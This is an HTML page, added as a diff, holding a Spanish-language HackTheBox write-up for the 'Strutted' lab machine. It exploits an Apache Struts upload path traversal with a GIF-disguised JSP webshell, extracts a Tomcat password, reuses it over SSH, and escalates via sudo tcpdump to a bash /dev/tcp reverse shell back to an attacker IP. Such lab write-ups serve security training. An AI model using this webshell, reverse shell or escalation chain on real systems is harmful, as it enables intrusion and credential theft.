@@ -1,0 +1,488 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Strutted | ZsZsec</title>
+<meta content="Writeup Completo Máquina Strutted HackTheBox Reconocimiento Escaneo de Puertos Iniciamos con un escaneo de puertos usando nmap : Puertos detectados: Puerto 22 SSH : OpenSSH Puerto..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">HackTheBox</p>
+<h1>Maquina Strutted<span>_</span></h1>
+<div class="writeup-meta"><span>HackTheBox</span></div>
+<div class="tag-row"><span class="tag">HackTheBox</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Writeup Completo - Máquina Strutted (HackTheBox)</h1>
+<hr/>
+<h2>Reconocimiento</h2>
+<h3>Escaneo de Puertos</h3>
+<p>Iniciamos con un escaneo de puertos usando <code>nmap</code>:</p>
+<pre><code class="language-bash">nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.30 -oG allPorts
+</code></pre>
+<p><strong>Puertos detectados:</strong></p>
+<ul>
+<li><strong>Puerto 22 (SSH):</strong> OpenSSH</li>
+<li><strong>Puerto 80 (HTTP):</strong> Servidor web</li>
+</ul>
+<h3>Análisis de la Aplicación Web</h3>
+<p>Al acceder a <code>http://strutted.htb</code>, encontramos una aplicación web que permite:</p>
+<ol>
+<li><strong>Subir archivos</strong> (con restricciones de tipo: JPG, JPEG, GIF)</li>
+<li><strong>Descargar el código fuente</strong> de la aplicación</li>
+</ol>
+<h4>Análisis del Código Fuente</h4>
+<p>Al descargar y examinar el código fuente, encontramos el archivo <code>pom.xml</code> que revela información crítica:</p>
+<pre><code class="language-xml">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.struts&lt;/groupId&gt;
+    &lt;artifactId&gt;struts2-core&lt;/artifactId&gt;
+    &lt;version&gt;6.3.0.1&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p><strong>Hallazgo crítico:</strong></p>
+<ul>
+<li><strong>Framework:</strong> Apache Struts 6.3.0.1</li>
+<li><strong>Servidor:</strong> Tomcat 9</li>
+<li><strong>Vulnerabilidad:</strong> CVE-2024-53677 (Path Traversal)</li>
+</ul>
+<hr/>
+<h2>Análisis de Vulnerabilidades</h2>
+<h3>CVE-2024-53677: Path Traversal en Apache Struts</h3>
+<h4>¿Qué es esta vulnerabilidad?</h4>
+<p>Apache Struts 6.3.0.1 contiene una vulnerabilidad de <strong>Path Traversal</strong> que permite a un atacante controlar la ubicación donde se guardan los archivos subidos mediante la manipulación del parámetro <code>uploadFileName</code>.</p>
+<h4>Componentes Técnicos de la Vulnerabilidad</h4>
+<h5>1. Sistema de File Upload de Struts</h5>
+<p>Struts maneja automáticamente los uploads mediante su <strong>FileUploadInterceptor</strong>. Para cada archivo subido, Struts crea tres propiedades:</p>
+<pre><code class="language-java">public class UploadAction extends ActionSupport {
+    private File Upload;              // Archivo temporal
+    private String uploadFileName;     // Nombre del archivo (VULNERABLE)
+    private String uploadContentType;  // Tipo MIME
+}
+</code></pre>
+<h5>2. El Parámetro <code>top.uploadFileName</code></h5>
+<p>Struts usa <strong>OGNL (Object-Graph Navigation Language)</strong> para acceder a propiedades:</p>
+<ul>
+<li><code>top</code>: El objeto Action actual (contexto raíz)</li>
+<li><code>uploadFileName</code>: Propiedad que contiene el nombre del archivo</li>
+</ul>
+<p><strong>La vulnerabilidad:</strong> Struts NO valida ni sanitiza <code>uploadFileName</code>, permitiendo secuencias como <code>../../</code></p>
+<p><strong>Construcción de la ruta:</strong></p>
+<pre><code>Ruta destino = UPLOAD_DIR + uploadFileName
+
+Si uploadFileName = "../../webapps/shell.jsp"
+Ruta final = /var/lib/tomcat9/uploads/TIMESTAMP/../../webapps/shell.jsp
+           = /var/lib/tomcat9/webapps/shell.jsp  (¡en el webroot!)
+</code></pre>
+<hr/>
+<h2>Explotación - CVE-2024-53677</h2>
+<h3>Fase 1: Bypass de Restricciones de Tipo de Archivo</h3>
+<p>La aplicación solo acepta archivos JPG, JPEG y GIF. Para bypassear esta restricción:</p>
+<h4>Técnica: Magic Bytes + Extension Spoofing</h4>
+<p><strong>Magic Bytes de GIF:</strong></p>
+<pre><code>GIF89a;
+</code></pre>
+<p>Los primeros bytes de un archivo determinan su tipo. Al agregar <code>GIF89a;</code> al inicio, engañamos al validador del servidor para que detecte un archivo GIF legítimo.</p>
+<h4>Payload JSP Malicioso</h4>
+<p>Después de los magic bytes, insertamos código JSP para crear una webshell:</p>
+<pre><code class="language-jsp">GIF89a;
+&lt;%@ page import="java.io.*" %&gt;
+&lt;%
+   String cmd = request.getParameter("cmd");
+   String output = "";
+   if(cmd != null) {
+      String s = null;
+      try {
+         Process p = Runtime.getRuntime().exec(cmd);
+         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
+         while((s = sI.readLine()) != null) {
+            output += s + "\n";
+         }
+      }
+      catch(IOException e) {
+         e.printStackTrace();
+      }
+   }
+%&gt;
+&lt;%= output %&gt;
+</code></pre>
+<p><strong>¿Por qué funciona?</strong></p>
+<p>Aunque el archivo comienza con bytes de GIF, cuando Tomcat procesa un archivo <code>.jsp</code>:</p>
+<ol>
+<li>Ejecuta todo el código Java dentro de <code>&lt;% %&gt;</code></li>
+<li>Los bytes <code>GIF89a;</code> son ignorados por el intérprete JSP</li>
+<li>La webshell se activa al acceder con <code>?cmd=comando</code></li>
+</ol>
+<h3>Fase 2: Explotación del Path Traversal</h3>
+<h4>Petición HTTP Maliciosa</h4>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/2b5ecbfe-311a-4cff-8e4c-8f035ea8cc33"/></p>
+<h4>Elementos Críticos de la Petición</h4>
+<ol>
+<li><p><strong><code>name="Upload"</code></strong></p>
+<ul>
+<li>El parámetro debe llamarse <code>Upload</code> porque el Action define el campo del upload con esa capitalización. Struts usa el nombre del input como base para asociar el <code>File</code>, y si no coincide, el FileUploadInterceptor no enlaza el archivo al Action</li>
+</ul>
+</li>
+<li><p><strong><code>filename="shell.gif"</code></strong></p>
+<ul>
+<li>Pasa la validación de tipo de archivo</li>
+<li>El servidor detecta los magic bytes GIF</li>
+</ul>
+</li>
+<li><p><strong><code>Content-Type: image/gif</code></strong></p>
+<ul>
+<li>Confirma al servidor que es una imagen</li>
+<li>Validación de MIME type satisfecha</li>
+</ul>
+</li>
+<li><p><strong><code>name="top.uploadFileName"</code></strong></p>
+<ul>
+<li>Parámetro adicional que controla la ubicación de guardado</li>
+<li><strong>Valor:</strong> <code>../../webapps/shell.jsp</code></li>
+</ul>
+</li>
+<li><p><strong>Path Traversal:</strong> <code>../../webapps/shell.jsp</code></p>
+<ul>
+<li>Escapa del directorio <code>uploads/</code></li>
+<li>Coloca el archivo en el webroot como <code>.jsp</code></li>
+<li>Tomcat ejecutará el código JSP</li>
+</ul>
+</li>
+</ol>
+<h1>Response</h1>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/cbda43ce-8be6-40ad-bd2e-68fe3f17dd74"/></p>
+<h4>Diagrama del Flujo de Ataque</h4>
+<pre><code>┌────────────────────────────────────────────────────────┐
+│ Atacante envía petición maliciosa                      │
+│ ┌─────────────────────────────────────────────────┐    │
+│ │ name="Upload" (MAYÚSCULA)                       │    │
+│ │ filename="shell.gif"                            │    │
+│ │ Content-Type: image/gif                         │    │
+│ │ Payload: GIF89a; + código JSP                   │    │
+│ │ top.uploadFileName: ../../webapps/shell.jsp     │    │
+│ └─────────────────────────────────────────────────┘    │
+└──────────────────┬─────────────────────────────────────┘
+                   │
+                   ▼
+┌────────────────────────────────────────────────────────┐
+│ Apache Struts procesa la petición                      │
+│ ┌─────────────────────────────────────────────────┐    │
+│ │ 1. Detecta propiedad "Upload"                   │    │
+│ │ 2. Valida magic bytes: GIF89a detectado         │    │
+│ │ 3. Lee uploadFileName: ../../webapps/shell.jsp  │    │
+│ │ 4. NO valida path traversal                     │    │
+│ └─────────────────────────────────────────────────┘    │
+└──────────────────┬─────────────────────────────────────┘
+                   │
+                   ▼
+┌────────────────────────────────────────────────────────┐
+│ Sistema resuelve ruta                                  │
+│ ┌─────────────────────────────────────────────────┐    │
+│ │ /uploads/20260108/../../../webapps/shell.jsp    │    │
+│ │ = /var/lib/tomcat9/webapps/shell.jsp            │    │
+│ └─────────────────────────────────────────────────┘    │
+└──────────────────┬─────────────────────────────────────┘
+                   │
+                   ▼
+┌────────────────────────────────────────────────────────┐
+│ Archivo guardado en webroot                            │
+│ ┌─────────────────────────────────────────────────┐    │
+│ │ Ubicación: /webapps/shell.jsp                   │    │
+│ │ Extensión: .jsp → Tomcat ejecutará el código    │    │
+│ │ Accesible vía: http://strutted.htb/shell.jsp    │    │
+│ └─────────────────────────────────────────────────┘    │
+└──────────────────┬─────────────────────────────────────┘
+                   │
+                   ▼
+┌────────────────────────────────────────────────────────┐
+│  RCE (Remote Code Execution) conseguido              │
+│                                                        │
+│ http://strutted.htb/shell.jsp?cmd=whoami              │
+│ Output: tomcat                                         │
+└────────────────────────────────────────────────────────┘
+</code></pre>
+<h3>Fase 3: Verificación de la Webshell</h3>
+<p>Una vez subido el archivo, verificamos el acceso:</p>
+<pre><code class="language-bash"># Comando básico
+curl "http://strutted.htb/shell.jsp?cmd=whoami"
+# Output: tomcat
+
+# Identificación del usuario
+curl "http://strutted.htb/shell.jsp?cmd=id"
+# Output: uid=998(tomcat) gid=998(tomcat) groups=998(tomcat)
+
+# Directorio actual
+curl "http://strutted.htb/shell.jsp?cmd=pwd"
+# Output: /var/lib/tomcat9
+</code></pre>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/97d92d0a-0832-423b-a34f-30f8fdf1a3d6"/></p>
+<hr/>
+<h2>Post-Explotación y Acceso SSH</h2>
+<h3>Enumeración del Sistema</h3>
+<h4>Exploración del Sistema de Archivos</h4>
+<pre><code class="language-bash"># Listar directorio actual
+http://strutted.htb/shell.jsp?cmd=ls%20-la
+
+# Output:
+# drwxr-xr-x 7 root   root   4096 Jul 20  2022 .
+# drwxr-xr-x 38 root  root   4096 Jul 20  2022 ..
+# lrwxrwxrwx 1 root   root     12 Jul 20  2022 conf -&gt; /etc/tomcat9
+# drwxr-xr-x 2 tomcat tomcat 4096 Jul 20  2022 lib
+# drwxr-xr-x 2 tomcat tomcat 4096 Jan  8 01:31 logs
+# drwxr-xr-x 3 root   root   4096 Jul 20  2022 policy
+# drwxr-xr-x 4 tomcat tomcat 4096 Jan  8 01:39 webapps
+# drwxr-xr-x 3 tomcat tomcat 4096 Jan  8 01:31 work
+</code></pre>
+<p><strong>🔍 Hallazgo crítico:</strong> El directorio <code>conf</code> es un <strong>symlink</strong> que apunta a <code>/etc/tomcat9</code></p>
+<pre><code class="language-bash">conf -&gt; /etc/tomcat9
+</code></pre>
+<h4>Búsqueda de Archivos de Configuración Sensibles</h4>
+<pre><code class="language-bash"># Listar contenido de /etc/tomcat9
+http://strutted.htb/shell.jsp?cmd=ls%20-la%20/etc/tomcat9
+
+# Output:
+# -rw-r----- 1 root tomcat 2902 Jan 11 2025 tomcat-users.xml
+# -rw-r--r-- 1 root root   7883 Jan 20 2025 server.xml
+# -rw-r--r-- 1 root root   2633 Jan 20 2025 web.xml
+</code></pre>
+<p><strong>Análisis de permisos de <code>tomcat-users.xml</code>:</strong></p>
+<pre><code>-rw-r----- 1 root tomcat 2902 Jan 11 2025 tomcat-users.xml
+</code></pre>
+<p>Desglose:</p>
+<ul>
+<li><strong>Owner:</strong> root (rw- = lectura/escritura)</li>
+<li><strong>Group:</strong> tomcat (r-- = solo lectura)</li>
+<li><strong>Others:</strong> sin permisos</li>
+</ul>
+<p>Como nuestro usuario es <code>tomcat</code> (gid=998) y pertenecemos al grupo <code>tomcat</code>, <strong>tenemos acceso de lectura</strong>.</p>
+<h3>Extracción de Credenciales</h3>
+<h4>Problema: Comandos de Lectura Bloqueados</h4>
+<p>Al intentar leer el archivo con comandos tradicionales, no obtenemos output:</p>
+<pre><code class="language-bash"># Intentos fallidos
+?cmd=cat /etc/tomcat9/tomcat-users.xml     #  Sin output
+?cmd=head /etc/tomcat9/tomcat-users.xml    #  Sin output
+?cmd=tail /etc/tomcat9/tomcat-users.xml    #  Sin output
+?cmd=strings /etc/tomcat9/tomcat-users.xml #  Sin output
+</code></pre>
+<p><strong>Posibles causas:</strong></p>
+<ol>
+<li>La webshell tiene problemas mostrando caracteres XML (<code>&lt;&gt;</code>)</li>
+<li>Output truncado por longitud</li>
+<li>Java SecurityManager bloqueando ciertos comandos</li>
+<li>Caracteres especiales rompiendo el rendering HTML</li>
+</ol>
+<h4>Solución: Codificación Base64</h4>
+<p>Para evadir estas restricciones, codificamos el archivo en <strong>Base64</strong>:</p>
+<pre><code class="language-bash">http://strutted.htb/shell.jsp?cmd=base64%20/etc/tomcat9/tomcat-users.xml
+</code></pre>
+<p><strong>¿Por qué funciona?</strong></p>
+<ul>
+<li>Base64 convierte el contenido en caracteres alfanuméricos (A-Z, a-z, 0-9, +, /)</li>
+<li>No contiene caracteres especiales que puedan romper el HTML</li>
+<li>Es seguro de transmitir por HTTP</li>
+</ul>
+<h4>Extracción y Decodificación</h4>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/664969a4-d9df-46c7-bad7-9a0dd4e77b3f"/></p>
+<ol>
+<li><p><strong>Copiar el output base64</strong> desde el código fuente de la página (<code>Ctrl+U</code> o botón derecho → Ver código fuente)</p>
+</li>
+<li><p><strong>Decodificar en la máquina atacante:</strong></p>
+</li>
+</ol>
+<pre><code class="language-bash">echo "PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz4KPC..." | base64 -d
+</code></pre>
+<h4>Contenido de tomcat-users.xml</h4>
+<blockquote>
+</blockquote>
+<p><strong>🔑 Credenciales encontradas:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Usuario</th>
+<th>Contraseña</th>
+<th>Roles</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>admin</td>
+<td>IT14d6SSP81k</td>
+<td>manager-gui, admin-gui</td>
+</tr>
+</tbody>
+</table>
+<h3>Pivoting: Ataque de Reutilización de Credenciales</h3>
+<h4>Enumeración de Usuarios del Sistema</h4>
+<pre><code class="language-bash">http://strutted.htb/shell.jsp?cmd=cat%20/etc/passwd%20|%20grep%20-E%20"/bin/bash|/bin/sh"
+
+# Output:
+# root:x:0:0:root:/root:/bin/bash
+# james:x:1000:1000:james:/home/james:/bin/bash
+</code></pre>
+<p><strong>Usuario identificado:</strong> <code>james</code> (uid=1000, usuario legítimo del sistema)</p>
+<h4>Password Reuse Attack</h4>
+<p>Las credenciales encontradas en configuraciones web frecuentemente se reutilizan en otros servicios. Probamos contra SSH:</p>
+<pre><code class="language-bash">ssh james@strutted.htb
+Password: IT14d6SSP81k
+</code></pre>
+<p>** Acceso conseguido!**</p>
+<pre><code class="language-bash">james@strutted:~$ whoami
+james
+
+james@strutted:~$ id
+uid=1000(james) gid=1000(james) groups=1000(james)
+
+james@strutted:~$ cat user.txt
+</code></pre>
+<hr/>
+<h2>Escalada de Privilegios</h2>
+<h3>Enumeración de Permisos SUDO</h3>
+<p>Una vez dentro del sistema como el usuario <code>james</code>, verificamos los permisos sudo:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/1392dc35-933f-417f-89f8-1ba94749dd3a"/></p>
+<p>** Hallazgo crítico:**</p>
+<ul>
+<li>El usuario <code>james</code> puede ejecutar <code>/usr/sbin/tcpdump</code> como root sin contraseña</li>
+<li>Parámetro: <code>(ALL) NOPASSWD:</code></li>
+</ul>
+<h3>Análisis de la Vulnerabilidad de tcpdump</h3>
+<h4>¿Por qué tcpdump es peligroso con sudo?</h4>
+<p><code>tcpdump</code> tiene varios parámetros que permiten ejecutar comandos externos:</p>
+<ul>
+<li><strong><code>-z postrotate-command</code></strong>: Ejecuta un comando después de rotar archivos de captura</li>
+<li><strong><code>-Z user</code></strong>: Cambia al usuario especificado después de abrir el dispositivo de captura</li>
+<li><strong><code>-W filecount</code></strong>: Número máximo de archivos de captura</li>
+<li><strong><code>-G rotate_seconds</code></strong>: Rota el archivo de captura cada N segundos</li>
+</ul>
+<h4>Cadena de Explotación</h4>
+<p><strong>Combinación peligrosa:</strong></p>
+<pre><code class="language-bash">sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $SCRIPT -Z root
+</code></pre>
+<p>Desglose de parámetros:</p>
+<ul>
+<li><code>-ln</code>: Modo no interactivo (no resolución DNS)</li>
+<li><code>-i lo</code>: Interfaz loopback (no requiere permisos especiales de red)</li>
+<li><code>-w /dev/null</code>: Escribir capturas a /dev/null (descartarlas)</li>
+<li><strong><code>-W 1</code></strong>: Limitar a 1 archivo (trigger para ejecutar el script)</li>
+<li><strong><code>-G 1</code></strong>: Rotar cada 1 segundo (trigger inmediato)</li>
+<li><strong><code>-z $SCRIPT</code></strong>: Ejecutar script después de rotar</li>
+<li><strong><code>-Z root</code></strong>: Mantener privilegios de root</li>
+</ul>
+<p><strong>Flujo de ataque:</strong></p>
+<pre><code>1. tcpdump inicia con permisos de root (vía sudo)
+2. Captura 1 paquete en loopback (límite: -W 1)
+3. Después de 1 segundo, rota el archivo (-G 1)
+4. Al rotar, ejecuta el script especificado en -z
+5. Script se ejecuta como root (-Z root)
+6. ¡Shell de root conseguida!
+</code></pre>
+<h3>Explotación</h3>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/f7e60c37-d97e-47d0-9814-ff6f93172c37"/></p>
+<h4>Paso 1: Preparar el Script Malicioso</h4>
+<p>Creamos un script temporal que establece una reverse shell:</p>
+<pre><code class="language-bash">james@strutted:/tmp$ COMMAND='bash -c "bash -i &gt;&amp; /dev/tcp/10.10.17.173/4444 0&gt;&amp;1"'
+james@strutted:/tmp$ TF=$(mktemp)
+james@strutted:/tmp$ echo "$COMMAND" &gt; $TF
+james@strutted:/tmp$ chmod +x $TF
+</code></pre>
+<p><strong>Desglose:</strong></p>
+<ul>
+<li><code>COMMAND</code>: Reverse shell usando bash</li>
+<li><code>mktemp</code>: Crea archivo temporal (ej: <code>/tmp/tmp.aBcDeF123</code>)</li>
+<li><code>echo "$COMMAND" &gt; $TF</code>: Escribe el comando en el archivo</li>
+<li><code>chmod +x $TF</code>: Da permisos de ejecución</li>
+</ul>
+<h4>Paso 2: Configurar Listener en Máquina Atacante</h4>
+<pre><code class="language-bash">nc -nlvp 4444
+</code></pre>
+<h4>Paso 3: Ejecutar tcpdump con Privilegios</h4>
+<pre><code class="language-bash">james@strutted:/tmp$ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
+tcpdump: listening on lo, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+Maximum file limit reached: 1
+1 packet captured
+4 packets received by filter
+0 packets dropped by kernel
+</code></pre>
+<p><strong>¿Qué sucede internamente?</strong></p>
+<pre><code>1. tcpdump inicia captura en interfaz loopback
+2. Detecta 1 paquete → límite alcanzado (-W 1)
+3. Ejecuta rotación de archivo (-G 1)
+4. Llama al script: /tmp/tmp.aBcDeF123
+5. Script ejecuta: bash -c "bash -i &gt;&amp; /dev/tcp/10.10.17.173/4444 0&gt;&amp;1"
+6. Conexión TCP saliente hacia 10.10.17.173:4444
+7. Shell interactiva de bash enviada al atacante
+</code></pre>
+<h4>Paso 4: Recibir Shell de Root</h4>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/9a5c9925-c777-4704-9173-b3235f2baea5"/></p>
+<h3>Diagrama de Escalada de Privilegios</h3>
+<pre><code>┌──────────────────────────────────────────────────────────┐
+│ Usuario: james (uid=1000)                                │
+│ Verificación de permisos sudo                            │
+└────────────────┬─────────────────────────────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────────────────────────────┐
+│ sudo -l                                                  │
+│ ┌──────────────────────────────────────────────────┐     │
+│ │ (ALL) NOPASSWD: /usr/sbin/tcpdump                │     │
+│ └──────────────────────────────────────────────────┘     │
+└────────────────┬─────────────────────────────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────────────────────────────┐
+│ Análisis de vectores de ataque                           │
+│ tcpdump tiene parámetros peligrosos:                     │
+│ • -z: Ejecuta comando después de rotar                   │
+│ • -Z root: Mantiene privilegios de root                  │
+└────────────────┬─────────────────────────────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────────────────────────────┐
+│ Preparación del payload                                  │
+│ ┌──────────────────────────────────────────────────┐     │
+│ │ COMMAND='bash -c "bash -i &gt;&amp; /dev/tcp/..."'      │     │
+│ │ TF=$(mktemp)                                     │     │
+│ │ echo "$COMMAND" &gt; $TF                            │     │
+│ │ chmod +x $TF                                     │     │
+│ └──────────────────────────────────────────────────┘     │
+└────────────────┬─────────────────────────────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────────────────────────────┐
+│ Listener en máquina atacante                             │
+│ nc -nlvp 4444                                            │
+└────────────────┬─────────────────────────────────────────┘
+                 │
+                 ▼
+┌──────────────────────────────────────────────────────────┐
+│ Ejecución del exploit                                    │
+│ sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 \         │
+│              -z $TF -Z root                              │
+│                                                          │
+│ ┌──────────────────────────────────────────────────┐     │
+│ │ 1. tcpdump inicia con permisos root              │     │
+│ │ 2. Captura en loopback (-i lo)                   │     │
+│ │ 3. Límite de 1 archivo alcanzado (-W 1)          │     │
+│ │ 4. Rotación activada (-G 1)                      │     │
+│ │ 5. Script ejecutado como root (-z $TF -Z root)   │     │
+│ │ 6. Reverse shell establecida                     │     │
+│ └──────────────────────────────────────────────────┘     │
+└────────────────┬─────────────────────────────────────────┘
+</code></pre>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
